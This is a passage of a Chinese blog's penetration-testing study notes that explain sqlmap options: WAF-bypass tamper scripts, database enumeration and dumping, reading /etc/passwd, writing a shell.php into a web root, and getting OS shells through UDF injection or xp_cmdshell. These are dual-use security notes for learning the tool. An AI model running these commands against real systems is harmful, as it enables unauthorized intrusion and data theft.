–skil-urlencode：默认get方法会对传输内容进行编码，但是某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据。这个只是个开关，没有=“”的赋值，开了就是使用原始字符提交数据</li><li>–eval<ul><li>  每次请求之前执行指定的Python代码</li><li>  每次请求更改或者增加新的参数值（时间依赖或者其他参数值依赖）</li><li>  比如<code>--data=&quot;127.0.0.1/?id=xxx&amp;hash=asdasdaasdasdasda&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code>当id和hash存在关联的时候，单独的注入id，每次必定都错，但是使用了eval这样会调用后面的语句，使得每次hash随着Id变化而实现注入</li><li>  这就需要手动在先才能注入的点 </li></ul></li></ul><h2 id="optimization-优化性能"><a href="#optimization-优化性能" class="headerlink" title="optimization  优化性能"></a>optimization  优化性能</h2><ul><li>–predict-output<ul><li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率<ul><li>  比如返回一个phpmyadmin，他比对表之后就觉得是mysql的，然后再进行mysql的进一步探测，而不是把orcle sql server，mysql这些都测试一次</li></ul></li><li>  可以检测版本名、用户名、密码、privileges、role、数据库名称、表名、列名</li><li>  与–threads参数不兼容</li><li>  统计表位置/usr/share/sqlmap/txt/common-outputs.txt</li></ul></li><li>–keep-alive<ul><li>  使用http(s)长连接，性能好</li><li>  与–proxy参数不兼容，因为他只保持一个链接</li><li>  长链接避免重复建立连接的网络开销，但大量的长连接会严重占用服务器资源</li></ul></li><li>–null-connection<ul><li>  只获取相应页面的大小值，而非页面的具体内容</li><li>  通常用于盲注判断真/假，降低网络带宽消耗</li><li>  与–text-only参数不兼容（基于页面内容的比较判断真/假）</li></ul></li><li>  -o开启上面的三个参数</li><li>–threads=N<ul><li>  最大并发线程，默认为1，官方建议不超过10，否则可能影响站点可用性</li><li>  盲注时每个线程获取一个字符（N次请求），获取完成后线程结束</li><li>  与–predict-output参数不兼容</li></ul></li></ul><h2 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h2><ul><li>  比较多，只比较重要的讲</li><li>  -p：指定扫描的参数，使得–level失效，-p “user-agent,referer”</li><li>  –skip=“id,user-agnet”  忽略指定的扫描参数，常常搭配–level=N使用</li><li>URL注入点<ul><li>  适用于一些奇葩的URL “URL/param1/value1*/param2/value2”这种参数和值在url里面以//来间隔表示的，在要注入的参数后面加上*，比如此处注入点指定就在value1这里</li><li>  这种是伪静态页面，只是开发人员魔改了url，即你看不到参数传递的过程，不要以为没有参数就不能注入，其实是可以的</li></ul></li><li>  –dbms=“MYSQL（+版本号）/oracleL（+版本号）”:指定特定的数据库，而不会一个个的库测试从而提高效率</li><li>  –os=”Linux/Windows”:提高效率</li><li>–invalid-bignum/–invalid-logical<ul><li>  sqlmap默认使用负值使得参数取值失效id=13===&gt;id=-13，一失效就可以配合其他的逻辑判断进行sql注入漏洞的发现</li><li>  bignum使用大数使得参数值失效id=89999999</li><li>  logical使用布尔判断使取值失效id=13 and 18=19</li></ul></li><li>–no-cast<ul><li>  sqlmap默认处理：榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换null结果</li><li>  老版本mysql数据库需要开启此开关，不然会提取不到数据</li></ul></li><li>–no-escape<ul><li>  出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap默认通过char()编码逃逸的方法替代字符串，如<code>select ‘foo’ </code>===&gt;<code>select char(102)+char(111)+char(111)</code>从而不需要单引号即可表示foo</li><li>  但是某些特殊情况，使用char又会出错，而本参数将关闭此功能</li></ul></li><li>–prefix/–suffix<ul><li>  某些地方需要指定特定的前缀和后缀，比如iscc的union那道题</li><li>  闭合特定的规则：比如id=（“‘“.$_GET[‘ID’].”’”）,普通的sql无法直接使用，这个时候指定–prefix=’)and –suffix=and (‘1’=’1 来闭合前后，这样id就是纯payload</li></ul></li><li>–tamper<ul><li>  混淆脚本，用于绕过应用层过滤，IPS，WAF</li><li>  /opt/sqlmap/tamper目录下已经有了不少编写好的taper脚本</li><li>  –tamper=”xxx1.py,xxx2.py”这样会在tamper目录下依次执行1,2脚本进行绕过，当然也可以指定绝对路径来执行tamper目录之外的脚本（对同一个payload执行1,2，并不是分开执行。比如同时使用大小写，内联注释/<em>!0000SelEct</em>/）</li></ul></li></ul><h2 id="Detection-探测"><a href="#Detection-探测" class="headerlink" title="Detection  探测"></a>Detection  探测</h2><ul><li>–level<ul><li>  1~5级。默认1级。可以在/usr/share/sqlmap/xml/payloads看下里面的payload，以及不同等级发送的payload类型</li></ul></li><li>–risk<ul><li>  1~4 默认1，他无害，当risk升高可造成数据被篡改等风险（update delete等操作），可能导致数据的不可恢复，进而网络安全法了解下</li></ul></li><li>–string=“xxx” –not-string=“xxx”,–regexp=“xxx”,–code=“200”,–text-only=“xxx”,–titles=“xxx”<ul><li>  页面比较，基于布尔的注入检测，sqlmap会依据返回页面内容的变化判断真假逻辑，但有些页面随着时间阀值变化，此时需要人为指定指标标示真假的依据</li></ul></li></ul><h2 id="technique-检测sql注入漏洞存在的类型"><a href="#technique-检测sql注入漏洞存在的类型" class="headerlink" title="technique 检测sql注入漏洞存在的类型"></a>technique 检测sql注入漏洞存在的类型</h2><ul><li>  默认使用全部技术 可以指定–technique=BEU</li><li>  B 布尔  E 错误  U 联合 T时间 S stacked queries（文件系统、操作系统，注册表必须使用S才能注入出来）</li><li>  –time-sec：指定时间注入检测相应延迟时间（默认5秒）</li><li>–union-cols：默认联合查询1-10列，随着level增加最多支持50列 <ul><li>  –union-cols 6-9：联合查询6-9列</li></ul></li><li>–union-char<ul><li>  联合查询默认使用null，极端情况下null可能失败，此时可以手动指定数值</li><li>  认?id=’ ‘union select ，经过比如–union-char 123，则为id=’123’union select</li></ul></li><li>–dns-domain<ul><li>  攻击者控制了某DNS服务器，使用此功能提高数据榨取速度，–dns-domain=”a.com”</li><li>  非常小众，而且仅仅只是提高速度而已</li></ul></li><li>–second-order<ul><li>  注入的结果在另外一个页面体现出来</li><li>  –second-ord http：//1.1.1.1/b.php</li></ul></li></ul><h2 id="fingerprint"><a href="#fingerprint" class="headerlink" title="fingerprint"></a>fingerprint</h2><ul><li>  -f/-b：DBMS，操作系统，架构，补丁</li></ul><h2 id="enumeration-枚举"><a href="#enumeration-枚举" class="headerlink" title="enumeration 枚举"></a>enumeration 枚举</h2><ol><li><p>探测</p><ul><li>–current-user/–user:当前数据库用户。而非操作系统管理员/所有用户账号</li><li>–current-db：当前数据库名称</li><li>–hostname</li><li>–privilege 查所有用户的权限  后面跟-U xxxx/-CU查指定/当前用户权限</li><li>–roles</li></ul></li><li><p>重要数据</p><ul><li>-D xx/-T xxx /-C xxx：指定数据库/表/列</li><li>–dbs/tables/columns：查库/表/列</li><li>–exclude-sysdbs:排除掉系统库</li><li>–schema：查元数据(存在information_schema库且有权访问他)</li><li>–count 看有几条记录</li><li>–batch：批处理，即每次选择的时候 选择默认选项，而不需要手动指定</li><li>dump数据 把数据下载到本地<ul><li>–dump-all dump所有数据 后面可以跟上 –exclude-sysdbs</li><li>–dump -C -T -D –start –stop ：自定义查询</li></ul></li><li>–sql-query=“select * from users”：指定特定的查询</li></ul></li></ol><h2 id="brute-force"><a href="#brute-force" class="headerlink" title="brute force"></a>brute force</h2><p>因为information_schema库只有在mysql5.0以上才有，而5.0以上还需要权限<br>微软的access数据库，默认无权读取msysobjects库</p><ul><li>–common-tables：暴力猜表</li><li>–common-columns：暴力猜列（可以-T 指定特定的表 不然就是破解当前表）</li></ul><h2 id="file-system"><a href="#file-system" class="headerlink" title="file system"></a>file system</h2><ul><li>  –file-read=”/etc/passwd”</li><li>  –file-write=”shell.php” ：shell必须在攻击者当前目录，不然就得注定绝对路径 –file-dest=“/var/www/html/xxx” 指定上传到受害者电脑上的位置</li></ul><h2 id="OS注入"><a href="#OS注入" class="headerlink" title="OS注入"></a>OS注入</h2><ul><li>–udf-inject: 注入用户自定义函数  –shared-lib:共享库的本地路径,从而实现UDFinjection 用户自定义函数注入<ul><li>  就是编译共享库创建并上传之DB server，以此生成自定义函数UDF实现高级注入</li><li>  需要有写入权限</li><li>  [paper](<a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-</a><br>full-control-whitepaper-4633857)</li></ul></li><li>–os-cmd  –os-shell –sql-shell<ul><li>  也是要写权限！</li><li>  在mysql和postgresql上是利用上传共享库并且生成sysy_exec(),sys_eval()两个UDF，在mssql上利用的xp_cmdshell存储过程（有就用，禁就启，没有建）</li></ul></li><li>windows注册表注入<ul><li> 前提要有操作注册表权限</li><li>  –reg-read/–reg-add/–geg-del：读取/增加、删除注册表键值</li><li>  –reg-key/–geg-value/–reg-data/–reg-type=“xxx”：定义键值具体内容</li></ul></li></ul><h2 id="一般参数"><a href="#一般参数" class="headerlink" title="一般参数"></a>一般参数</h2><ul><li>  -s：sqlite会话保存位置</li><li>  -t:记录流量位置保存位置</li><li>  –charset=“GBK”:强制字符编码</li><li>  –crawl=N:从起始位置爬站的深度</li><li>  –csv-del：dump下来的数据默认存于以”,”分割的CSV文件中，可以指定其他的分隔符</li><li>  –dbms-cred=”usr:passwd”：指定数据库账号</li><li>  –flush-session：清空刚刚查询的本地缓存session内容（本地缓存session的机制使得第二次执行的速度更快）</li><li>  –refresh-queries:忽略session查询结果</li><li>  –force-ssl：使得访问https的网站</li><li>  –hex：dump非ascii字符内容时，将其编码为16进制形式之后下载，绕过传输过程中的一定的过滤或其他影响，收到后sqlmap自动解码还原</li><li>  –output-dir=/temp/xxx  指定输出结果保存位置</li><li>  –parse-errors：分析和显示数据库内建报错信息</li><li>  –save：将命令保存为配置文件，需要指定保存位置</li><li>  -z：参数助记符,比如–batch 可以写成 -z=”bat”表示</li><li>  –answer=“extend=N” 适用于某些地方需要你手动填写，batch处理总以默认处理，你又不想默认值，于是遇到比如extend的时候 这个时候回答就是N</li><li>  –check-waf：检测waf/ips/ids</li><li>–hpp：http parameter pollution<ul><li>  绕过WAF、IPS、IDS的有效方法</li><li>  尤其对工作在windows平台的站点ASP/iis和asp.net/iis有用</li></ul></li><li>–identify-waf：彻底的waf/ips/ids检查<ul><li>  支持30多种产品</li></ul></li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li>  –mobile:模拟手机设备</li><li>  –purge：清空output文件夹（同时也就清除了session）</li><li>  –smart：当有大量检测目标时，只选择被怀疑有注入点的地方进行注入，而非每个都尝试</li><li>  –wizard：向导 即提示你一步一步的填写入参数。但是只是填写基础的参数</li></ul><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><ul><li>  网页版：freebuf<a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></li><li>  图片版：原图4.2M，出处见图水印，可以自己用网页打开下载到本地<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708233306.png" alt="20190708233306.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
